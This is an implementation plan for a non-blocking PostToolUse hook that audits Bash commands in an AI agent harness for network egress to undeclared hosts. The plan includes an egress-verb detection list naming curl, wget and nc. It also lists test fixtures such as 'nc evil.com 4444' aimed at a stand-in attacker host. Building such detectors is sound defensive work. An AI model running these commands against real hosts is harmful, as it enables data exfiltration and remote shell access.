# Network-Egress Audit + Network-Axis Reframe — Implementation Plan

> Sub-feature of v3.1. Resolves the network-axis enforcement gap surfaced in the
> 2026-05-31 PR-2 completeness audit. USER decision: **reframe + Bash-egress audit**
> (advisory detection), NOT prevention (prevention is evadable pattern-blocking →
> ContainerAdapter-tier; building it now would repeat the tool-mask theater ADR-0012 warns of).

## Context & honest framing

"Network axis" is **two** problems, not one:

| Vector | Enforced today? | Mechanism |
|---|---|---|
| **Tool-mediated** (`WebFetch`/`WebSearch`/MCP fetch) | ✅ already | harness honors `agents/<name>.md` `tools:` (ADR-0012) — don't grant the tool → no egress through it |
| **Bash-subprocess egress** (`curl`/`wget`/`nc` in a Bash call) | ❌ the gap | `tools:` grants "Bash" wholesale; can't express "Bash minus curl" |

This plan closes the **observability** half of the Bash-egress gap: a `PostToolUse:Bash`
advisory detector that flags egress to hosts NOT in the declared trait allowlist. It is
**audit, not prevention** — pattern-matching is a coarse net (evadable via base64 / `python -c`
sockets), documented as defense-in-depth (mirrors `spawn-record.scrubSecrets`' honesty).

**Dead mechanisms (do NOT rebuild):** static `network`-axis reconciliation (no `tools:` referent
— the validator already decided this correct-by-design); runtime `updatedInput` masking (inert
per ADR-0012; the `pre-spawn-tool-mask` network-strip never fired).

## Routing

`route-decide` → **borderline (0.3)** (substrate-meta dictionary catch-22; hook-authoring tokens
absent). Judgment: design-settled ~200 LoC build, not architect-shaped → **inline build +
read-only review lenses** (code-reviewer + honesty-auditor), not a HETS team. Hook layer per
H.7.19: **PostToolUse** (advisory observability, non-blocking — never a gate). Correct per the
validator-conventions decision tree.

## Design (SOLID: pure core + thin I/O shell)

- **`packages/kernel/_lib/network-egress-detect.js`** *(NEW, pure — no I/O)*
  - `NETWORK_EGRESS_VERBS` — egress-capable verbs (`curl|wget|nc|netcat|ssh|scp|sftp|telnet`;
    `gh`/`aws` deliberately OMITTED as first-party-API noise), extracted here so the LIVE audit
    doesn't depend on the dead, unregistered tool-mask — DIP. (Final impl narrowed the seed set
    + renamed `…_PATTERNS` → `…_VERBS`; rationale lives in `network-egress-detect.js:23`.)
  - `extractEgressHosts(command) → string[]` — parse hosts from `https?://host`, `nc host port`,
    `ssh user@host`/`scp …@host`. Best-effort; lone egress-verb with no parseable host is reported
    separately (low-confidence), not as a named-host finding.
  - `loadDeclaredHosts(registry) → string[]` — union of every trait's `network[]` (today
    `["api.anthropic.com"]`). Pure (takes the parsed registry object).
  - `isLoopback(host)` — `localhost|127.0.0.1|::1|0.0.0.0` are never egress.
  - `auditCommand(command, allowlist) → { undeclaredHosts: string[], egressVerbNoHost: bool }` —
    the pure verdict the hook acts on.
- **`packages/kernel/observability/network-egress-audit.js`** *(NEW, PostToolUse:Bash hook)*
  - Reads stdin; pulls `tool_input.command`; loads the traits registry (fail-soft default
    `["api.anthropic.com"]`); calls `auditCommand`.
  - **Named undeclared host** → `logger('egress-undeclared', …)` + `process.stdout.write` an
    advisory `[NETWORK-EGRESS-UNDECLARED] host(s): … — not in any declared trait network allowlist`.
    Forcing-instruction class **1 (advisory)**, like error-critic.
  - **Egress verb, no parseable host** → log only (avoid alert noise).
  - Carries the spawn context when present (`cwd` containing `.claude/worktrees/` ⇒ a sub-agent
    Bash call — surfaced in the log for later persona attribution; per-persona allowlist is a
    deferred v2, global-allowlist MVP now — KISS/YAGNI).
  - **Fail-soft**: any error → exit 0 silently (never break a Bash call). Non-blocking by nature
    (PostToolUse).
- **`packages/kernel/hooks.json`** — register on `PostToolUse:Bash` (sibling of `error-critic`),
  with an explanatory `_comment` (reframes the network story; supersedes the stale tool-mask
  "follow-up" note on the route-decide entry).

## TDD test inventory (write RED first)

`tests/unit/kernel/_lib/network-egress-detect.test.js`:
1. `https://evil.com/x` ⇒ `undeclaredHosts:["evil.com"]`.
2. `curl https://api.anthropic.com/v1` ⇒ no finding (allowlisted).
3. `curl http://localhost:3000` / `127.0.0.1` ⇒ no finding (loopback).
4. `npm test` / `ls -la` (no egress verb) ⇒ no finding.
5. `nc evil.com 4444` ⇒ `undeclaredHosts:["evil.com"]`.
6. `curl "$URL"` (egress verb, host unparseable) ⇒ `egressVerbNoHost:true`, `undeclaredHosts:[]`.
7. `loadDeclaredHosts(registry)` ⇒ `["api.anthropic.com"]` from the real registry object.
8. multi-host (`curl a.com && wget https://b.net`) ⇒ both flagged.

`tests/unit/kernel/observability/network-egress-audit.test.js`:
9. malformed/empty stdin ⇒ exit 0, no throw (fail-soft).
10. undeclared host in command ⇒ advisory emitted on stdout.

## Doc reframe (the honesty half of the USER decision)

- **`MEMORY.md`** — replace "extend reconciliation validator to the NETWORK axis (closes the
  restriction the tool-mask falsely claimed)" with the honest decomposition: tool-mediated =
  enforced via `tools:`; Bash-egress = now **audited** (this hook); real prevention = ContainerAdapter
  (deferred). Network is NOT a viable static-reconciliation follow-up.
- **`packages/kernel/hooks.json`** — update the route-decide-entry `_comment`: drop "network-axis
  binding in that validator is the follow-up" (the validator correctly rejects it); point to the
  audit hook + ContainerAdapter for the rest.
- **`docs/ROADMAP.md`** — network row: tool-mediated enforced / Bash-egress audited / prevention deferred.
- **`packages/runtime/orchestration/contracts-validate.js`** — the network comment (L1087-1093) is
  already correct ("un-reconciled by design"); add a one-line pointer to the audit hook so the two
  sites stop reading as a contradiction.
- **`packages/runtime/contracts/traits/_registry.json`** — fix `network_anthropic._doc`: it
  localized the audit to "at promote-deltas" (wrong lifecycle); the audit actually fires on
  `PostToolUse:Bash`. Repoint it at `network-egress-audit.js` + the tool-vs-Bash decomposition.
  (Honesty-audit F2 corrected the original plan's "no edit needed" — it *did* need one.)

## Verification

- `node --test` the two new test files ⇒ green.
- `node packages/kernel/observability/network-egress-audit.js < fixture.json` smoke ⇒ advisory on
  an `evil.com` curl, silent on `api.anthropic.com`.
- `bash install.sh --hooks --test` ⇒ eslint (84) + yaml (83) + markdownlint (80) green; **prune
  any stale `.claude/worktrees/` first** (Test 80 scans them).
- Read-only review: **code-reviewer** (fd/leak/edge-cases, regex ReDoS) + **honesty-auditor**
  (no over-claim: "audit not prevention", "coarse net"). NOT the Write-capable security-auditor
  (read-only-verify rule).

## Out of scope (honest)

- **Prevention** (PreToolUse:Bash deny) — evadable + false-positives + ContainerAdapter-tier.
- **Per-persona allowlist attribution** — needs spawn→persona correlation at Bash-time; v2.
- **In-process / non-Bash egress** — tool-mediated, already `tools:`-gated.
- **Airtight detection** — impossible via regex; this is defense-in-depth, stated as such.

## PR boundary (USER merge gate)

Standalone PR ("network-egress audit + axis reframe"), separate from the OQ-21 spike (PR-3a).
The 2 residual PR-2 plan-honesty nits (k3b/P6 retention; contextItem/consumes_context_envelope
deferral) can ride with whichever lands first.

## Drift notes

- **DN:** `hooks.json` `_comment` and `contracts-validate.js` L1087-1093 contradicted each other on
  network ("follow-up" vs "correct-by-design absent"). `drift:plan-honesty`-adjacent (two live
  sites disagreeing on substrate state). Reconciled here.
- **DN:** MEMORY recorded "network-axis reconciliation" as a viable mechanical next chore; the
  shipped validator says it isn't. Optimistic-follow-up drift; corrected.
